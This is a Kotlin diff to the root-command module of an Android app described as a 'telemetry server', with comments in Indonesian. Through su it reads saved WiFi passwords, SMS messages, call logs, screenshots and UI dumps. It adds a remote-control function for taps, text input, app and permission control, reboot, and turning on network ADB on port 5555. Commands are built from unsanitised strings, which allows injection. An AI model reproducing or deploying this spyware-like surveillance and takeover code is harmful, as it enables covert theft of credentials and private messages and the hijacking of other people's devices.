@@ -3,9 +3,15 @@ package com.irfanfrizki.telemetry.server
 import android.content.Context
 import android.os.Build
 import android.util.Log
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.BufferedReader
+import java.io.InputStreamReader
 import java.io.File
+import java.util.concurrent.TimeUnit
+import java.util.concurrent.TimeoutException
 
 /**
  * Root detection and privileged command execution.
@@ -48,23 +54,24 @@ object RootManager {
         return checkRootStatus(context)
     }
 
+    /** 
+     * Cek status root dengan benar untuk Magisk modern.
+     * Kuncinya: JANGAN cek File.exists() path su — Magisk menyembunyikannya.
+     * Langsung coba jalankan "su -c id" dan lihat hasilnya.
+     */
     private fun computeRootStatus(context: Context): RootStatus {
-        val suPaths = arrayOf(
-            "/system/bin/su", "/system/xbin/su", "/sbin/su",
-            "/system/sbin/su", "/vendor/bin/su", "/su/bin/su",
-            "/data/adb/magisk/su", "/magisk/.core/bin/su"
-        )
-
-        val hasSuBinary = suPaths.any { File(it).exists() && File(it).canExecute() }
-        if (!hasSuBinary) return RootStatus.NONE
-
-        // Cek Magisk
-        val isMagisk = isMagiskInstalled(context) ||
-            File("/data/adb/magisk").exists() ||
-            File("/magisk").exists()
-
         // Coba jalankan su -c id (timeout 5 detik)
-        val hasRootAccess = executeRootCommand("id")?.contains("uid=0") == true
+        val output = executeRootCommandBlocking("id")
+        val hasRootAccess = output?.contains("uid=0") == true
+
+        // Cek apakah Magisk terpasang (via package manager atau path khas)
+        val isMagisk = try {
+            context.packageManager.getPackageInfo("com.topjohnwu.magisk", 0)
+            true
+        } catch (_: Exception) {
+            // Fallback: cek path Magisk yang mungkin terbaca
+            File("/data/adb/magisk").exists() || File("/magisk").exists()
+        }
 
         return when {
             isMagisk && hasRootAccess -> RootStatus.MAGISK_GRANTED
@@ -74,27 +81,46 @@ object RootManager {
         }
     }
 
-    private fun isMagiskInstalled(context: Context): Boolean {
-        return try {
-            context.packageManager.getPackageInfo("com.topjohnwu.magisk", 0)
-            true
-        } catch (_: Exception) {
-            false
-        }
+    /**
+     * Jalankan perintah root di thread terpisah (IO), kembalikan output (trimmed)
+     * atau null jika gagal/timeout. Menggunakan timeout yang benar.
+     */
+    private suspend fun executeRootCommandSuspend(cmd: String): String? = withContext(Dispatchers.IO) {
+        executeRootCommandBlocking(cmd)
     }
 
-    /** Jalankan perintah root di thread terpisah, kembalikan output (trimmed) atau null jika gagal/timeout. */
-    fun executeRootCommand(cmd: String): String? {
+    /** Blocking version untuk dipakai di computeRootStatus (non-suspend). */
+    private fun executeRootCommandBlocking(cmd: String): String? {
         return try {
             val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
-            val output = process.inputStream.bufferedReader().use { it.readText() }
-            val finished = process.waitFor(SU_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
+            
+            // Baca output dengan timeout yang benar
+            val output = StringBuilder()
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            var line: String?
+            while (reader.readLine().also { line = it } != null) {
+                output.append(line).append('\n')
+            }
+            
+            // Wait with timeout
+            val finished = process.waitFor(SU_TIMEOUT_MS, TimeUnit.MILLISECONDS)
             if (!finished) {
                 process.destroyForcibly()
                 Log.w(TAG, "su -c timeout: $cmd")
                 return null
             }
-            output.trim()
+            
+            val exitValue = process.exitValue()
+            if (exitValue != 0) {
+                val err = process.errorStream.bufferedReader().use { it.readText() }
+                Log.w(TAG, "su -c exit $exitValue: $cmd, err: $err")
+                return null
+            }
+            
+            output.toString().trim()
+        } catch (e: TimeoutException) {
+            Log.w(TAG, "su -c timeout exception: $cmd")
+            null
         } catch (e: Exception) {
             Log.w(TAG, "su -c failed: $cmd", e)
             null
@@ -104,9 +130,8 @@ object RootManager {
     /** Jalankan banyak perintah root sekaligus (satu su session), return map cmd->output. */
     fun executeRootCommands(cmds: Array<String>): Map<String, String?> {
         val script = cmds.joinToString("\n")
-        val output = executeRootCommand(script)
+        val output = executeRootCommandBlocking(script)
         if (output == null) return cmds.associateWith { null }
-        // Output gabungan, parse per baris (asumsi output per command 1 baris)
         val lines = output.lines().toList()
         return cmds.mapIndexed { i, c -> c to lines.getOrNull(i)?.trim() }.toMap()
     }
@@ -126,14 +151,14 @@ object RootManager {
 
     /** Screenshot via screencap -p (return base64 PNG). */
     fun takeScreenshot(): String? {
-        val output = executeRootCommand("screencap -p")
+        val output = executeRootCommandBlocking("screencap -p")
         return output?.let { android.util.Base64.encodeToString(it.toByteArray(), android.util.Base64.NO_WRAP) }
     }
 
     /** Aplikasi foreground akurat via dumpsys window/activity. */
     fun getForegroundApp(): JSONObject? {
-        val output = executeRootCommand("dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp' | head -1")
-        val output2 = executeRootCommand("dumpsys activity top | grep -E 'ACTIVITY|Package' | head -3")
+        val output = executeRootCommandBlocking("dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp' | head -1")
+        val output2 = executeRootCommandBlocking("dumpsys activity top | grep -E 'ACTIVITY|Package' | head -3")
         val combined = "${output ?: ""}\n${output2 ?: ""}".trim()
         return if (combined.isNotBlank()) {
             JSONObject().put("raw", combined)
@@ -144,12 +169,12 @@ object RootManager {
     fun getUiDump(): String? {
         val tmpFile = "/data/local/tmp/uidump.xml"
         val cmd = "rm -f $tmpFile; uiautomator dump $tmpFile; cat $tmpFile"
-        return executeRootCommand(cmd)
+        return executeRootCommandBlocking(cmd)
     }
 
     /** Daftar proses lengkap dengan RAM/CPU per aplikasi. */
     fun getProcessList(): JSONArray {
-        val output = executeRootCommand("ps -A -o pid,ppid,user,pcpu,pmem,comm,args | head -50")
+        val output = executeRootCommandBlocking("ps -A -o pid,ppid,user,pcpu,pmem,comm,args | head -50")
         val arr = JSONArray()
         output?.lines()?.forEach { line ->
             if (line.isNotBlank() && !line.startsWith("PID")) {
@@ -161,7 +186,7 @@ object RootManager {
 
     /** Memori per paket via dumpsys meminfo. */
     fun getMemInfo(pkg: String): JSONObject? {
-        val output = executeRootCommand("dumpsys meminfo $pkg")
+        val output = executeRootCommandBlocking("dumpsys meminfo $pkg")
         return output?.let { JSONObject().put("raw", it) }
     }
 
@@ -298,7 +323,7 @@ object RootManager {
 
     /** Tabel ARP. */
     fun getArpTable(): JSONArray {
-        val output = executeRootCommand("cat /proc/net/arp")
+        val output = executeRootCommandBlocking("cat /proc/net/arp")
         val arr = JSONArray()
         output?.lines()?.drop(1)?.forEach { line ->
             val parts = line.trim().split("\\s+")
@@ -318,7 +343,7 @@ object RootManager {
 
     /** Password WiFi tersimpan (butuh root baca /data/misc/wifi/). */
     fun getSavedWifiPasswords(): JSONArray {
-        val output = executeRootCommand("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -A2 -B2 'PreSharedKey'")
+        val output = executeRootCommandBlocking("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -A2 -B2 'PreSharedKey'")
         val arr = JSONArray()
         output?.let { arr.put(JSONObject().put("raw", it)) }
         return arr
@@ -326,7 +351,7 @@ object RootManager {
 
     /** Statistik data per aplikasi (UID-based) via /proc/net/xt_qtaguid/stats. */
     fun getUidNetworkStats(): JSONArray {
-        val output = executeRootCommand("cat /proc/net/xt_qtaguid/stats 2>/dev/null | head -30")
+        val output = executeRootCommandBlocking("cat /proc/net/xt_qtaguid/stats 2>/dev/null | head -30")
         val arr = JSONArray()
         output?.lines()?.drop(1)?.forEach { line ->
             val parts = line.trim().split("\\s+")
@@ -341,98 +366,109 @@ object RootManager {
         return arr
     }
 
-    /** Kirim input (tap, swipe, keyevent, text). */
-    fun sendInput(cmd: String): Boolean {
-        return executeRootCommand("input $cmd") != null
-    }
-
-    /** Kontrol aplikasi (am start, am force-stop, pm grant/revoke). */
-    fun controlApp(action: String, pkg: String, extra: String = ""): Boolean {
-        return when (action) {
-            "start" -> executeRootCommand("am start -n $extra") != null
-            "force-stop" -> executeRootCommand("am force-stop $pkg") != null
-            "grant" -> executeRootCommand("pm grant $pkg $extra") != null
-            "revoke" -> executeRootCommand("pm revoke $pkg $extra") != null
-            "clear" -> executeRootCommand("pm clear $pkg") != null
-            else -> false
-        }
-    }
-
-    /** Kontrol sistem: screen, wifi, airplane, brightness, volume, reboot. */
-    fun controlSystem(action: String, value: String = ""): Boolean {
-        return when (action) {
-            "screen_on" -> executeRootCommand("input keyevent KEYCODE_WAKEUP") != null
-            "screen_off" -> executeRootCommand("input keyevent KEYCODE_SLEEP") != null
-            "wifi" -> executeRootCommand("svc wifi ${value.lowercase()}") != null
-            "airplane" -> executeRootCommand("settings put global airplane_mode_on ${if (value == "on") 1 else 0}; am broadcast -a android.intent.action.AIRPLANE_MODE --ez state ${value == "on"}") != null
-            "brightness" -> executeRootCommand("settings put system screen_brightness $value") != null
-            "volume" -> executeRootCommand("media volume --stream 3 --set $value") != null
-            "reboot" -> executeRootCommand("reboot") != null
-            "adb_wifi_on" -> executeRootCommand("setprop service.adb.tcp.port 5555; stop adbd; start adbd") != null
-            "adb_wifi_off" -> executeRootCommand("setprop service.adb.tcp.port -1; stop adbd; start adbd") != null
-            else -> false
-        }
-    }
-
-    /** Data sensitif: call log, SMS, app list dengan ukuran data. */
+    /** Riwayat panggilan. */
     fun getCallLog(): JSONArray {
-        val output = executeRootCommand("content query --uri content://call_log/calls --projection number,date,duration,type,name --sort 'date DESC' | head -20")
+        val output = executeRootCommandBlocking("content query --uri content://call_log/calls --projection number,date,duration,type,name --sort 'date DESC' | head -20")
         val arr = JSONArray()
         output?.lines()?.forEach { line ->
-            if (line.startsWith("Row:")) arr.put(line.substringAfter("Row: ").trim())
+            if (line.isNotBlank()) arr.put(line.trim())
         }
         return arr
     }
 
+    /** SMS. */
     fun getSms(): JSONArray {
-        val output = executeRootCommand("content query --uri content://sms --projection address,date,body,type --sort 'date DESC' | head -20")
+        val output = executeRootCommandBlocking("content query --uri content://sms --projection address,date,body,type --sort 'date DESC' | head -20")
         val arr = JSONArray()
         output?.lines()?.forEach { line ->
-            if (line.startsWith("Row:")) arr.put(line.substringAfter("Row: ").trim())
+            if (line.isNotBlank()) arr.put(line.trim())
         }
         return arr
     }
 
+    /** Daftar aplikasi + ukuran data. */
     fun getInstalledAppsWithSize(): JSONArray {
-        val output = executeRootCommand("pm list packages -s -U | head -30")
+        val output = executeRootCommandBlocking("pm list packages -s -U | head -30")
         val arr = JSONArray()
         output?.lines()?.forEach { line ->
             if (line.startsWith("package:")) {
                 val pkg = line.substringAfter("package:")
-                val sizeOut = executeRootCommand("du -sh /data/data/$pkg 2>/dev/null | cut -f1")
+                val sizeOut = executeRootCommandBlocking("du -sh /data/data/$pkg 2>/dev/null | cut -f1")
                 arr.put(JSONObject().apply {
                     put("package", pkg)
-                    put("dataSize", sizeOut ?: "?")
+                    put("dataSize", sizeOut ?: "unknown")
                 })
             }
         }
         return arr
     }
 
-    // ===== Helpers =====
+    /** Kontrol jarak jauh: input tap/swipe/keyevent/text, am start/force-stop, pm grant/revoke, dll. */
+    fun executeControl(action: String, extra: String = "", value: String = "", args: JSONObject = JSONObject()): Boolean {
+        return when (action) {
+            "tap" -> executeRootCommandBlocking("input tap ${args.optInt("x")} ${args.optInt("y")}") != null
+            "swipe" -> executeRootCommandBlocking("input swipe ${args.optInt("x1")} ${args.optInt("y1")} ${args.optInt("x2")} ${args.optInt("y2")} ${args.optInt("duration", 300)}") != null
+            "keyevent" -> executeRootCommandBlocking("input keyevent ${args.optInt("keycode")}") != null
+            "text" -> executeRootCommandBlocking("input text ${args.optString("text").replace(" ", "%s")}") != null
+            "start" -> executeRootCommandBlocking("am start -n $extra") != null
+            "force-stop" -> executeRootCommandBlocking("am force-stop $extra") != null
+            "grant" -> executeRootCommandBlocking("pm grant $extra ${args.optString("perm")}") != null
+            "revoke" -> executeRootCommandBlocking("pm revoke $extra ${args.optString("perm")}") != null
+            "clear" -> executeRootCommandBlocking("pm clear $extra") != null
+            "screen_on" -> executeRootCommandBlocking("input keyevent KEYCODE_WAKEUP") != null
+            "screen_off" -> executeRootCommandBlocking("input keyevent KEYCODE_SLEEP") != null
+            "wifi" -> executeRootCommandBlocking("svc wifi ${value.lowercase()}") != null
+            "airplane" -> executeRootCommandBlocking("settings put global airplane_mode_on ${if (value == "on") 1 else 0}; am broadcast -a android.intent.action.AIRPLANE_MODE --ez state ${value == "on"}") != null
+            "brightness" -> executeRootCommandBlocking("settings put system screen_brightness $value") != null
+            "volume" -> executeRootCommandBlocking("media volume --stream 3 --set $value") != null
+            "reboot" -> executeRootCommandBlocking("reboot") != null
+            "adb_wifi_on" -> executeRootCommandBlocking("setprop service.adb.tcp.port 5555; stop adbd; start adbd") != null
+            "adb_wifi_off" -> executeRootCommandBlocking("setprop service.adb.tcp.port -1; stop adbd; start adbd") != null
+            else -> false
+        }
+    }
+
+    // ===== Helper =====
 
     private fun readSysFile(path: String): String? {
-        return try { File(path).readText().trim().takeIf { it.isNotBlank() } } catch (_: Exception) { null }
+        return try {
+            File(path).readText().trim().takeIf { it.isNotBlank() }
+        } catch (_: Exception) {
+            null
+        }
     }
 
     private fun readProcStat(): Pair<Long, Long>? {
         return try {
-            val line = File("/proc/stat").bufferedReader().use { it.readLine() } ?: return null
+            val line = File("/proc/stat").readText().lines().firstOrNull() ?: return null
             val parts = line.trim().split("\\s+")
-            if (parts.size < 5 || parts[0] != "cpu") return null
-            val nums = parts.drop(1).take(8).map { it.toLong() }
-            val idle = nums[3] + nums.getOrElse(4) { 0L }
-            Pair(nums.sum(), idle)
-        } catch (_: Exception) { null }
+            if (parts.size >= 5) {
+                val user = parts[1].toLongOrNull() ?: 0L
+                val nice = parts[2].toLongOrNull() ?: 0L
+                val system = parts[3].toLongOrNull() ?: 0L
+                val idle = parts[4].toLongOrNull() ?: 0L
+                val iowait = parts.getOrNull(5)?.toLongOrNull() ?: 0L
+                val irq = parts.getOrNull(6)?.toLongOrNull() ?: 0L
+                val softirq = parts.getOrNull(7)?.toLongOrNull() ?: 0L
+                val steal = parts.getOrNull(8)?.toLongOrNull() ?: 0L
+                val total = user + nice + system + idle + iowait + irq + softirq + steal
+                total to idle
+            } else null
+        } catch (_: Exception) {
+            null
+        }
     }
 
-    private fun parseHexAddr(s: String): String {
+    private fun parseHexAddr(hex: String): String {
         return try {
-            val parts = s.split(":")
-            if (parts.size != 2) return s
-            val ip = parts[0].chunked(2).reversed().joinToString(".") { it.toInt(16).toString() }
-            val port = parts[1].toInt(16)
-            "$ip:$port"
-        } catch (_: Exception) { s }
+            val parts = hex.split(":")
+            if (parts.size != 2) return hex
+            val ip = parts[0].let { java.lang.Long.parseLong(it, 16) }
+            val port = parts[1].let { java.lang.Integer.parseInt(it, 16) }
+            val octets = (3 downTo 0).map { (ip shr (it * 8)) and 0xFF }.joinToString(".")
+            "$octets:$port"
+        } catch (_: Exception) {
+            hex
+        }
     }
 }
